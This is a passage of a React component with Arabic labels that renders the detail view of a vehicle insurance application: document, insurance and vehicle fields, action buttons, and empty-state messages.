                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
                              >
                                <CheckCircle className="w-4 h-4 mr-2" />
                                حفظ
                              </Button>
                              <Button
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98] bg-transparent"
                              >
                                <XCircle className="w-4 h-4 mr-2" />
                                إلغاء
                              </Button>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* 5. Document Info */}
                      {hasDocumentInfo(selectedApplication) && (
                        <div
                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "400ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2 rounded-lg bg-primary/10">
                              <FileText className="w-4 h-4 text-primary" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات الوثيقة</h3>
                          </div>
                          <div className="space-y-3">
                            {selectedApplication.documentType && (
                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">نوع الوثيقة</span>
                                <span className="text-sm font-medium text-foreground">
                                  {selectedApplication.documentType}
                                </span>
                              </div>
                            )}
                            {selectedApplication.serialNumber && (
                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">الرقم التسلسلي</span>
                                <span className="text-sm font-mono text-foreground">
                                  {selectedApplication.serialNumber}
                                </span>
                              </div>
                            )}
                            {selectedApplication.phoneNumber && (
                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">رقم الهاتف</span>
                                <span className="text-sm font-mono text-foreground" dir="ltr">
                                  {selectedApplication.phoneNumber}
                                </span>
                              </div>
                            )}
                            {selectedApplication.country && (
                              <div className="flex justify-between items-center py-2 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">الدولة</span>
                                <span className="text-sm font-medium text-foreground">
                                  {selectedApplication.country}
                                </span>
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 6. Insurance Info */}
                      {hasInsuranceInfo(selectedApplication) && (
                        <div
                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "500ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2 rounded-lg bg-success/10">
                              <Shield className="w-4 h-4 text-success" />
                            </div>
                            <h3 className="font-semibold text-foreground">تفاصيل التأمين</h3>
                          </div>
                          <div className="space-y-3">
                            {selectedApplication.insuranceType && (
                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">نوع التأمين</span>
                                <span className="text-sm font-medium text-foreground">
                                  {selectedApplication.insuranceType}
                                </span>
                              </div>
                            )}
                            {selectedApplication.insuranceStartDate && (
                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">تاريخ البدء</span>
                                <span className="text-sm font-medium text-foreground">
                                  {selectedApplication.insuranceStartDate}
                                </span>
                              </div>
                            )}
                            {selectedApplication.repairLocation && (
                              <div className="flex justify-between items-center py-2 transition-colors hover:bg-muted/30 px-2 rounded">
                                <span className="text-sm text-muted-foreground">موقع الإصلاح</span>
                                <span className="text-sm font-medium text-foreground">
                                  {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
                                </span>
                              </div>
                            )}
                          </div>
                        </div>
                      )}

                      {/* 7. Vehicle Info */}
                      {hasVehicleInfo(selectedApplication) && (
                        <div
                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
                          style={{ animationDelay: "600ms" }}
                        >
                          <div className="flex items-center gap-3 mb-4">
                            <div className="p-2 rounded-lg bg-chart-4/10">
                              <Car className="w-4 h-4 text-chart-4" />
                            </div>
                            <h3 className="font-semibold text-foreground">معلومات المركبة</h3>
                          </div>
                          <div className="grid grid-cols-2 gap-4">
                            {selectedApplication.vehicleModel && (
                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
                                <p className="text-xs text-muted-foreground mb-1">الموديل</p>
                                <p className="text-sm font-medium text-foreground">
                                  {selectedApplication.vehicleModel}
                                </p>
                              </div>
                            )}
                            {selectedApplication.manufacturingYear && (
                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
                                <p className="text-xs text-muted-foreground mb-1">سنة الصنع</p>
                                <p className="text-sm font-medium text-foreground">
                                  {selectedApplication.manufacturingYear}
                                </p>
                              </div>
                            )}
                            {selectedApplication.vehicleValue && (
                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
                                <p className="text-xs text-muted-foreground mb-1">القيمة</p>
                                <p className="text-sm font-medium text-foreground">
                                  {selectedApplication.vehicleValue} ريال
                                </p>
                              </div>
                            )}
                            {selectedApplication.vehicleUsage && (
                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-chart-4/30 hover:bg-chart-4/5">
                                <p className="text-xs text-muted-foreground mb-1">الاستخدام</p>
                                <p className="text-sm font-medium text-foreground">
                                  {selectedApplication.vehicleUsage}
                                </p>
                              </div>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  ) : (
                    /* Empty state when no grid data exists */
                    <div className="flex items-center justify-center h-full">
                      <div className="text-center animate-in fade-in zoom-in duration-500">
                        <div className="w-20 h-20 rounded-2xl bg-muted/50 flex items-center justify-center mx-auto mb-4">
                          <FileText className="w-10 h-10 text-muted-foreground" />
                        </div>
                        <h3 className="text-lg font-semibold text-foreground mb-2">لا توجد بيانات</h3>
                        <p className="text-sm text-muted-foreground">لم يتم إضافة أي معلومات لهذا الطلب بعد</p>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center animate-in fade-in zoom-in duration-500">
                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mx-auto mb-4">
                  <Mail className="w-10 h-10 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold text-foreground mb-2">اختر طلباً لعرض التفاصيل</h3>
                <p className="text-sm text-muted-foreground">اضغط على أي طلب من القائمة الجانبية</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
